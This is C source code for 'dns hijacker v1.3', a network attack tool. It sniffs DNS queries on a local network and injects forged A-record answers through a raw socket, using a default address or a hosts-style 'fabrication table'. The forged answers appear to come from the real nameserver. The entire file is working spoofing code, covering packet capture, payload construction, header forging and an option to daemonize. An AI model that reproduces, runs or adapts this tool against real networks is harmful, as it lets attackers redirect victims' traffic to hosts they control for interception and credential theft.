/******************************************************************************
 *  [ dns hijacker v1.3 ]                                                     *
 *                                                                            *
 *  pedram amini (pedram@redhive.com)                                         *
 *  pedram.redhive.com                                                        *
 *                                                                            *
 *  v1.3 changes                                                              *
 *     - added DLT_RAW datalink interface for ppp users.                      *
 *     - fixed buffer overflow condition in convert name routine.             *
 *                                                                            *
 *  v1.2 changes                                                              *
 *      - memory for ftable is now dynamically allocated                      *
 *      - removed unused signal handling code (wasn't x-platform safe anyway) *
 *      - changed pcap_open_live timeout to 1000, which resolves issues on    *
 *        freebsd, thanks to aaron smith <aaron@mutex.org>                    *
 *                                                                            *
 *  v1.1 changes                                                              *
 *      - added number of spoofed answers count                               *
 *      - dns hijacker can now be daemonized                                  *
 *      - added the option to suppress "ignored *" activity output            *
 *      - added the option to output statistics (rrdtool)                     *
 *      - miscellaneous code formatting changes                               *
 *                                                                            *
 ******************************************************************************/

#include "dnshijacker.h"

int main (int argc, char **argv)    {
    int  i,
         opt,
         socket;                    /* socket to write on             */
    char *packet,                   /* captured packet                */
         *device          = NULL,   /* interface to sniff on          */
         *ft_filename     = NULL,   /* fabrication table filename     */
         *output_filename = NULL,   /* output statistics filename     */
         filter[1024],              /* tcpdump style capture filter   */
         errbuf[PCAP_ERRBUF_SIZE];  /* error buffer for pcap          */
    pid_t pid;                      /* used in daemonizing            */
    FILE *os;                       /* output statistics file handle  */
    struct pcap_pkthdr pcap_h;      /* pcap packet header             */
    pcap_t *capdev;                 /* the capture device             */

    /*
     *  catch sig
     */

    /*if (signal(SIGINT, catch_signals) == SIG_ERR)   {
        perror ("sigset failed for SIGINT");
        exit (EXIT_FAILURE);
    }*/

    /*
     *  prepare the chewy center
     */

    memset(&chewycenter, '\0', sizeof(struct cc));

    /*
     *  parse the command line
     */

    while ((opt = getopt(argc, argv, "d:f:hi:o:psvz")) != EOF)    {
        switch (opt)  {
            case 'd':               /* default answer */
                chewycenter.default_answer = optarg;
                dflag++;
                break;
            case 'f':               /* fabrication table */
                ft_filename = optarg;
                fflag++;
                break;
            case 'i':               /* interface */
                device = optarg;
                break;
            case 'o':               /* output statistics filename */
                output_filename = optarg;
                oflag++;
                break;
            case 'p':               /* print only */
                pflag++;
                break;
            case 's':               /* supress printing of "ignored *" */
                sflag++;
                break;
            case 'v':               /* verbose */
                vflag++;
                break;
            case 'z':               /* daemonize */
                zflag++;
                break;
            case 'h':               /* usage */
            case '?':
                usage(argv);
                break;
        }
    }

    /*
     *  if there is no default spoof address or fabrication table specified
     *  and the user doesn't just want to print captured dns packets
     *  then we have a problem, because we have no idea what to spoof answers with
     */

    if (!dflag && !fflag && !pflag)
        usage(argv);

    /*
     *  if a fabrication table file was specified fill the ftable with values from it
     */

    if (fflag)
        fill_table(ft_filename);

    /*
     * daemonize if we have to
     * we do this after we fill the table because we chdir() here
     */

    if (zflag)  {
        pid = fork();

        if (pid < 0) {
            printf("\ncould not daemonize");
            exit (EXIT_FAILURE);
        }

        if (pid != 0)
            exit (EXIT_SUCCESS);

        fclose(stdin); fclose(stdout); fclose(stderr);
        setsid();
        chdir("/");
        umask(0);
    }

    /*
     *  make sure there is a device to sniff on
     */

    if (!device)
        device = pcap_lookupdev(errbuf);

    if (!device) {
        fprintf(stderr, "\ndevice lookup failed");
        exit (EXIT_FAILURE);
     }

    /*
     *  set capture filter
     *  defaults to only capturing traffic destined to a nameserver
     */

    argc -= optind;
    argv += optind;

    strcpy(filter, "udp dst port 53");
    if (argc != 0)  {
        strcat(filter, " and ");
        strcat(filter, copy_argv(argv));
    }

    /*
     *  prepare the device for capturing
     */

    capdev = set_cap_dev(device, filter);

    /*
     *  if we're not only watching grab a socket to write on
     */

    if (!pflag)
        if ((socket = libnet_open_raw_sock(IPPROTO_RAW)) == -1)
            libnet_error(LIBNET_ERR_FATAL, "network initialization failed\n");

    /*
     *  print some informative information
     */

    printf("\n[ dns hijacker %s ]\n", VERSION);
    printf("\nsniffing on:       %s", device);
    printf("\nusing filter:      %s", filter);
    if (dflag) printf("\ndefault answer:    %s", chewycenter.default_answer);
    if (fflag) printf("\nfabrication table: %s", ft_filename);
    if (pflag) printf("\nprint only mode");
    if (sflag) printf("\nsuppressing ignored activity output");
    printf("\n");

    /*
     *  main loop
     *  this is where it all happens...
     *  - sniff a packet
     *  - parse through that packet printing packet information and
     *    store relevant values in our struct
     *  - build an appropriate fabricated answer and
     *    store it in our struct
     *  - if we're not only watching
     *    write the packet
     *  - if we want to store statistics and we're not only watching
     *    open, write to, and close the statistics file
     */

    for (;;)   {
        packet = (u_char *)pcap_next(capdev, &pcap_h);

        if (packet == NULL)
            continue;

        parse_dns(packet, (int)pcap_h.caplen);

        if (!pflag)
            spoof_dns(socket);

        if (oflag && !pflag)  {
            os = fopen(output_filename, "w+");
            fprintf(os, "%d", num_spoofed_answers);
            fclose(os);
        }
    }

    /* not reached */
    return (EXIT_SUCCESS);
}


/******************************************************************************
 * catch_signals                                                              *
 *                                                                            *
 *  signal catcher and handler                                                *
 *  arg1: (int) signal number                                                 *
 *  ret:  none, we exit the program from here                                 *
 ******************************************************************************/
/*void catch_signals (int signo)  {
    switch (signo)  {
        case SIGINT:
            printf("\nexiting...\n");
            exit(EXIT_SUCCESS);
    }
}*/


/******************************************************************************
 * copy_argv (from tcpdump)                                                   *
 *                                                                            *
 *  used for extracting filter string from command line                       *
 *  arg1: (char **) pointer to vector arguments                               *
 *  ret:  (char *)  filter string                                             *
 ******************************************************************************/
char *copy_argv (char **argv)    {
    char **p, *buf, *src, *dst;
    u_int len = 0;

    p = argv;
    if (*p == 0)
        return 0;

    while (*p)
        len += strlen(*p++) + 1;

    if ((buf = (char *)malloc(len)) == NULL) {
        perror("malloc");
        exit (EXIT_FAILURE);
    }

    p = argv;
    dst = buf;
    while ((src = *p++) != NULL) {
        while ((*dst++ = *src++) != '\0');
        dst[-1] = ' ';
    }
    dst[-1] = '\0';

    return buf;
}


/******************************************************************************
 * fill_table                                                                 *
 *                                                                            *
 *  fill the fabrication table with entries from a file                       *
 *  the file should be of standard hosts format                               *
 *  arg1: (char *) filename                                                   *
 *  ret:  none                                                                *
 ******************************************************************************/
void fill_table (char *ft_filename) {
    FILE *ft;                       /* fstream pointer                */
    int i,                          /* loop counter                   */
        ftable_size;                /* num lines in fabrication table */
    char line[128];                 /* current line being processed   */

    /*
     *  open the file
     */

    ft = fopen(ft_filename, "r+");

    if (!ft)    {
        perror("fill_table failed");
        exit (1);
    }

    /*
     * determine the size of the fabrication table.
     * ignore comments and blank lines.
     */

    for (ftable_size = 0; fgets(line, 128, ft) != NULL; ftable_size++) {
        if ((line[0] == '#') || (line[0] == '\n'))
            ftable_size--;
    }

    /*
     * allocate memory for the fabrication table
     */

    ftable = (struct ft_entry *)malloc(sizeof(struct ft_entry) * ftable_size);

    /*
     *  rewind and step through the the file line by line
     *  read the first 2 entries from each line, the rest are comments
     */

    rewind(ft);

    for (i = 0; i < ftable_size; i++)    {
        if (fgets(line, 128, ft) == NULL)
            break;

        if ((line[0] == '#') || (line[0] == '\n'))  {
            i--;
            continue;
        }

        sscanf(line, "%s%s", ftable[i].ip, ftable[i].name);
    }

    /*
     *  make a record of how many entries we've read
     */

    num_entries = i;

    #if defined DEBUG
        printf("\nDEBUG> fabrication table:");
        for (i = 0; i < num_entries; i++)
            printf("\n[%d] %s\t%s", i, ftable[i].ip, ftable[i].name);
        printf("\n\n");
    #endif

    /*
     *  we're done with the file, close it
     */

    fclose(ft);
}


/******************************************************************************
 *  parse_dns                                                                 *
 *                                                                            *
 *  take a packet and print it (verbose or not)                               *
 *  store relevant information in our cc struct                               *
 *  arg1: (char *) pointer to packet                                          *
 *  arg2: (int)    captured packet length                                     *
 *  ret:  none                                                                *
 ******************************************************************************/
void parse_dns (char *packet, int caplen)   {
    struct   ip      *ip;           /* ip header                   */
    struct   udphdr  *udp;          /* udp header                  */
    struct   dnshdr  *dns;          /* dns header                  */
    char     *data,                 /* pointer to dns payload      */
             *data_backup,          /* we modify data so keep orig */
             name[128];             /* storage for lookup name     */
    u_long   rdata;                 /* rdata in network byte order */
    int      datalen,               /* length of dns payload       */
             c = 1,                 /* used in name extraction     */
             i;                     /* loop counter                */

    ip   = (struct ip     *) (packet + offset);
    udp  = (struct udphdr *) (packet + offset + LIBNET_IP_H);
    dns  = (struct dnshdr *) (packet + offset + LIBNET_IP_H + LIBNET_UDP_H);
    data = (packet + offset + LIBNET_IP_H + LIBNET_UDP_H + LIBNET_DNS_H);

    /*
     *  we modify the data pointer, so save the original position
     */

    data_backup = data;

    /*
     *  print dns packet source_address:port > destination_address:port
     */

    printf("\ndns activity:        %s:%d > ", inet_ntoa(ip->ip_src), ntohs(udp->uh_sport));
    printf("%s:%d",                           inet_ntoa(ip->ip_dst), ntohs(udp->uh_dport));

    /*
     *  clean out our name array and grab length of name to convert
     */

    memset(name, '\0', sizeof(name));
    datalen = strlen(data);

    #if defined DEBUG
            printf("\nDEBUG> datalen: %d", datalen);
    #endif

    /*
     *  convert name...
     *  dns names are of the form 3www7redhive3com
     *  we need to convert it to the more friendly www.redhive.com
     */

    if (dn_expand((u_char *)dns, packet + caplen, data, name, sizeof(name)) < 0)
        return;

    /*
     *  restore the data pointer
     */

    data = data_backup;

    /* kill the trailing '.' */
    name[datalen-1] = '\0';

    /*
     *  are we looking at a question or an answer?
     */

    if (htons(dns->qdcount) > 0 && htons(dns->ancount) == 0)
        printf("\t[%s = ?]", name);
    else if (htons(dns->ancount) > 0)
        printf("\t[%s = real answer]", name);

    /*
     *  what type of question is it?
     */

    #if defined DEBUG
        printf("\nDEBUG> data: %#x", *(data+datalen+2));
        if ( ((int)*(data+datalen+2)) == T_A)
            printf("\nDEBUG> type: A");

        if ( ((int)*(data+datalen+2)) == T_PTR)
            printf("\nDEBUG> type: PTR");
    #endif

    /*
     *  print more verbose packet information
     */

    if (vflag)   {
        printf("\ndns id:              %d", ntohs(dns->id));
        printf("\nrecursion desired:   %d", dns->rd);
        printf("\ntruncated message:   %d", dns->tc);
        printf("\nauthoritive answer:  %d", dns->aa);
        printf("\nopcode:              %d", dns->opcode);
        printf("\nresponse flag:       %d", dns->qr);
        printf("\nresponse code:       %d", dns->rcode);
        printf("\nrecursion available: %d", dns->ra);
        printf("\nnumber questions:    %d", htons(dns->qdcount));
        printf("\nnumber answers:      %d", htons(dns->ancount));
        printf("\nnumber authority:    %d", htons(dns->nscount));
    }

    /* print seperator */
    printf("\n--");

    /*
     *  bake the chewycenter
     */

    chewycenter.src_address = ip->ip_src.s_addr;
    chewycenter.dst_address = ip->ip_dst.s_addr;
    chewycenter.src_port    = udp->uh_sport;
    chewycenter.dst_port    = udp->uh_dport;
    chewycenter.dns_id      = dns->id;

    /*
     *  we only spoof packets from nameservers
     *  if the source of the question is not a client
     *  we don't waste any time building a packet, simply return
     */

    if (ntohs(chewycenter.dst_port) != 53) {
        return;
    }

    /*
     *  check the question type
     *  the question type is stored in the 2 bytes after the variables length name
     *  if the question is not of type A we return since we are only spoofing those type answers
     */

    if ( ((int)*(data+datalen+2)) == T_A)
        chewycenter.is_a = 1;
    else    {
        chewycenter.is_a = 0;
        return;
    }

    /*
     *  we start clean withno answer, also we set the current question
     */

    chewycenter.current_answer   = NULL;
    strncpy(chewycenter.current_question, name, 128);

    /*
     *  if there is a fabrication table search the list for an appropriate entry
     */

    if (fflag)
        chewycenter.current_answer = search_table(name);

    /*
     *  if an entry was not found and a default address is specified use it
     */

    if (!chewycenter.current_answer && dflag)    {
        chewycenter.current_answer = chewycenter.default_answer;
    }

    /*
     *  if an entry was not found and a default address is not specified then we ignore packet
     */

    if (!chewycenter.current_answer && !dflag)   {
        chewycenter.have_answer = 0;
        return;
    }

    /*
     *  if we've gotten this far it means that we have an answer to write
     */

    chewycenter.have_answer = 1;

    /*
     *  convert rdata from char * to something useable (unsigned long in network byte order)
     */

    rdata = libnet_name_resolve(chewycenter.current_answer, 0);

    /*
     *  build the payload
     *
     *  payload format: (very rudimentary ascii diagram)
     *  +-------------------------------|----------------------|--------------+
     *  | variable length question name | 2 byte question type | 2 byte class |
     *  |-------------------------------|----------------------|--------------|
     *  | variable length answer name   | 2 byte question type | 2 byte class |
     *  |-------------------------------|----------------------|--------------|
     *  | 4 byte time to live           | 2 byte rdata length  | 4 byte rdata |
     *  +-------------------------------|----------------------|--------------+
     *
     *  good lord is this ugly, but it works
     *  00 00 00 00 00 04 = 4 byte ttl + 2 byte rdata length
     *  rdata length is always 4, this is because we are only dealing with T_A
     *  hence rdata will always be a dotted quad
     */

    memcpy(chewycenter.payload, data, datalen + 5);

    memcpy(chewycenter.payload + datalen + 5, data, datalen + 5);

    memcpy(chewycenter.payload + 2 * (datalen + 5), "\x00\x00\x00\x00\x00\x04", 6);

    *((u_long *)(chewycenter.payload + 2 * (datalen + 5) + 6 + 0)) = rdata;

    chewycenter.payload_size = 2 * (datalen + 5) + 10;

    #if defined DEBUG
        printf("\nDEBUG>\ndata [%d]: ", datalen);
            for (i = 0; i < datalen+5; i++)
                printf("%x ", data[i]);
        printf("\n");

        printf("\nDEBUG>\nchewycenter [%d]: ", chewycenter.payload_size);
            for (i = 0; i < chewycenter.payload_size; i++)
                printf("%x ", chewycenter.payload[i]);
        printf("\n");
    #endif
}


/******************************************************************************
 * search_table                                                               *
 *                                                                            *
 *  search the fabrication table and see if we have an answer to this question*
 *  really lame search routine, this is something that needs changing         *
 *  arg1: (char *) entry to search for                                        *
 *  ret:  (char *) the answer (ip address)                                    *
 ******************************************************************************/
char *search_table (char *haystack)  {
    int i;

    for (i = 0; i < num_entries; i++)   {
        if (strstr(haystack, ftable[i].name) != NULL)
            return (ftable[i].ip);
    }

    return NULL;
}


/******************************************************************************
 *  set_cap_dev                                                               *
 *                                                                            *
 *  sniff on appropriate device, set filter, and calculate datalink offset    *
 *  arg1: (char *)   pointer to device name                                   *
 *  arg2: (char *)   pointer to filter string                                 *
 *  ret:  (pcap_t *) pointer to pcap device                                   *
 ******************************************************************************/
pcap_t *set_cap_dev (char *device, char *filter)    {
    unsigned int network, netmask;  /* for filter setting    */
    struct bpf_program prog;        /* store compiled filter */
    struct pcap_pkthdr pcap_h;      /* pcap packet header    */
    pcap_t *capdev;                 /* the capture device    */
    char errbuf[PCAP_ERRBUF_SIZE];  /* pcap error buffer     */

    pcap_lookupnet(device, &network, &netmask, errbuf);

    if ((capdev = pcap_open_live(device, SNAPLEN, PROMISC, 1000, errbuf)) == NULL)    {
        perror("pcap_open_live");
        exit (EXIT_FAILURE);
    }

    /*
     *  we only want to see traffic specified by filter
     *  so compile and set it
     */

    pcap_compile(capdev, &prog, filter, 0, netmask);
    pcap_setfilter(capdev, &prog);

    /*
     *  set datalink offset, EN10MB is all we really need
     */

    switch (pcap_datalink(capdev)) {
        case DLT_EN10MB:
            offset = 14;
            break;
        case DLT_IEEE802:
            offset = 22;
            break;
        case DLT_FDDI:
            offset = 21;
            break;
        case DLT_NULL:
            offset = 4;
            break;
        case DLT_RAW:
            offset = 0;
            break;
        default:
            fprintf(stderr, "\n%s bad datalink type", device);
            exit (EXIT_FAILURE);
            break;
  }
  return capdev;
}


/******************************************************************************
 *  spoof_dns                                                                 *
 *                                                                            *
 *  check some conditions, build the actual packet, and write the answer      *
 *  arg1: (int) socket to write on                                            *
 *  ret:  none                                                                *
 ******************************************************************************/
void spoof_dns (int socket)   {
    struct  in_addr src, dst;       /* used for printing addresses */
    int     written_bytes,          /* number of bytes written     */
            packet_size,            /* size of our packet          */
            i;                      /* misc                        */
    u_char  *packet;                /* we build this               */

    /*
     *  check the following conditions before spoofing
     *  if any of these conditions are violated then no spoofing is done
     *  - we only want to spoof packets from a nameserver
     *  - we only want to spoof packets from questions of type A
     *  - we only want to spoof packets if we have an answer
     */

    if (ntohs(chewycenter.dst_port) != 53) {
        if (!sflag) {
            printf("\nignoring packet:     destination not a nameserver");
            printf("\n--");
        }
        return;
    }

    if (!chewycenter.is_a)  {
        if (!sflag) {
            printf("\nignoring packet:     question is not of type A");
            printf("\n--");
        }
        return;
    }

    if (!chewycenter.have_answer)   {
        if (!sflag) {
            printf("\nignoring packet:     no answer for this question");
            printf("\n--");
        }
        return;
    }

    /*
     * if we're here it means we're ready to spoof an answer, lets reflect that
     * in the spoofed answers count
     */

    num_spoofed_answers++;

    /*
     *  packet memory allocation
     */

    packet_size = chewycenter.payload_size + LIBNET_IP_H + LIBNET_UDP_H + LIBNET_DNS_H;

    libnet_init_packet(packet_size, &packet);
    if (packet == NULL) {
        libnet_error(LIBNET_ERR_FATAL, "libnet_init_packet failed\n");
        return;
    }

    /*
     *  ip header construction
     *  source and destination are swapped here because we are spoofing a reply
     */

    libnet_build_ip(LIBNET_UDP_H + LIBNET_DNS_H,
            0,                                   /* ip tos              */
            0,                                   /* ip id               */
            0,                                   /* fragmentation bits  */
            64,                                  /* ttl                 */
            IPPROTO_UDP,                         /* protocol            */
            chewycenter.dst_address,             /* source address      */
            chewycenter.src_address,             /* destination address */
            NULL,                                /* payload             */
            0,                                   /* payload length      */
            packet);                             /* packet buffer       */

     /*
      *  udp header construction
      *  source and destination ports are swapped here too
      *
      * during debugging i found that we weren't generating the correct
      * length here, that is why a payload length is included (payload + dns_header)
      * although, from what i know, it really shouldn't be here
      */

    libnet_build_udp(53,                         /* source port      */
            ntohs(chewycenter.src_port),         /* destination port */
            NULL,                                /* payload          */
            chewycenter.payload_size + 12,       /* payload length   */
            packet + LIBNET_IP_H);

    /*
     *  dns header construction
     */

    libnet_build_dns(ntohs(chewycenter.dns_id),  /* dns id                      */
            0x8580,                              /* control flags (QR,AA,RD,RA) */
            1,                                   /* number of questions         */
            1,                                   /* number of answer RR's       */
            0,                                   /* number of authority  RR's   */
            0,                                   /* number of additional RR's   */
            chewycenter.payload,                 /* payload                     */
            chewycenter.payload_size,            /* payload length              */
            packet + LIBNET_IP_H + LIBNET_UDP_H);

    /*
     *  calculate checksum
     */

    libnet_do_checksum (packet, IPPROTO_UDP, packet_size - LIBNET_IP_H);

    /*
     *  write packet
     */

    written_bytes = libnet_write_ip(socket, packet, packet_size);

    /*
     *  make sure the number of written bytes jives with what we expect
     */

    if (written_bytes < packet_size)    {
        printf("\nwarning:             ");
        libnet_error(LN_ERR_WARNING, "libnet only wrote %d of %d bytes", written_bytes, packet_size);
        printf("\n--");
    }

    /*
     *  we're done with this packet
     */

    libnet_destroy_packet(&packet);

    /*
     *  announce what we've just done
     *  remember that we've swapped the addresses/ports
     */

    src.s_addr = chewycenter.src_address;
    dst.s_addr = chewycenter.dst_address;

    printf("\nspoofing answer:     %s:%d > ", inet_ntoa(dst), ntohs(chewycenter.dst_port));
    printf("%s:%d",                           inet_ntoa(src), ntohs(chewycenter.src_port));

    printf("\t[%s = %s]", chewycenter.current_question, chewycenter.current_answer);

    #if defined DEBUG
        printf("\nDEBUG>\n payload: [%d]", chewycenter.payload_size);
        for (i = 0; i < 52; i++)
            printf("%x ", chewycenter.payload[i]);
        printf("\n");
    #endif

    printf("\n--");

    if (oflag)  {

    }
}


/******************************************************************************
 *  usage                                                                     *
 *                                                                            *
 *  strip /'s and print program usage                                         *
 *  arg1: (char **) pointer to vector arguments                               *
 *  ret:  none                                                                *
 ******************************************************************************/
void usage (char **argv)    {
    char *p, *name;

    if ((p = strrchr(argv[0], '/')) != NULL)
        name = p + 1;
    else
        name = argv[0];

    printf("\n[ dns hijacker %s ]", VERSION);
    printf("\n Usage: %s [options] optional-tcpdump-filter", name);
    printf("\n \t-d <xxx.xxx.xxx.xxx> default address to answer with");
    printf("\n \t-f <filename> tab delimited fabrication table");
    printf("\n \t-i <interface> to sniff/write on");
    printf("\n \t-o <filename> file to write output statistics to");
    printf("\n \t-p print only, don't spoof answers");
    printf("\n \t-s supress printing of ignored activity");
    printf("\n \t-v print verbose dns packet information");
    printf("\n \t-z daemonize");
    printf("\n\n");

    exit (EXIT_FAILURE);
}

